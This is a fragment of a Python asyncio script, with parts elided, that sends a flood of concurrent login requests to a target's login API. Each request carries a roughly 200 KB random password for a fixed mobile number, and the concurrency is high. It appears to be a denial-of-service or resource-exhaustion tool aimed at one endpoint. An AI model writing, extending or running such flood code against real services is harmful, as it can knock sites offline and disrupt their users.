...
CONCURRENCY_LEVEL = 1024


CONCURRENT_WORKERS = multiprocessing.cpu_count()  *6
...
async def main():
    ...
    payload = {
        "mobile":"998931234567",
        "password": os.urandom(1024*100).hex(),
        "equipment":1
    }
    ...
    async with ClientSession(base_url=target_url, headers=headers) as session:
        ...
        for i in range(CONCURRENT_WORKERS):
            t = asyncio.create_task(send_http_request(
                url=LOGIN_API_ENDPOINT,
                payload=payload,
                session=session,
                # sem=asyncio.Semaphore(CONCURRENCY_LEVEL // CONCURRENT_WORKERS),
            ))
            tasks.append(t)
